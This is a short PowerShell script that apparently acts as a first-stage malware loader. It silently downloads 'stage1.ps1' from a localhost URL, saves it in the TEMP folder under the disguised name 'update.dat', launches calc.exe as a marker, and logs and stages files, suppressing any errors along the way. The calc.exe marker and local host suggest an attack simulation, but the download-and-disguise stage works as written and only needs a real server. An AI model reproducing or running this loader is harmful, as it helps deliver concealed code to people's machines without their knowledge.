
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://localhost:8080/stage1.ps1",
    [string]$OutputPath = "$env:TEMP\update.dat",
    [int]$RequestTimeout = 95
)
try { Invoke-WebRequest -Uri $PayloadUrl -OutFile $OutputPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Loader step failed" }
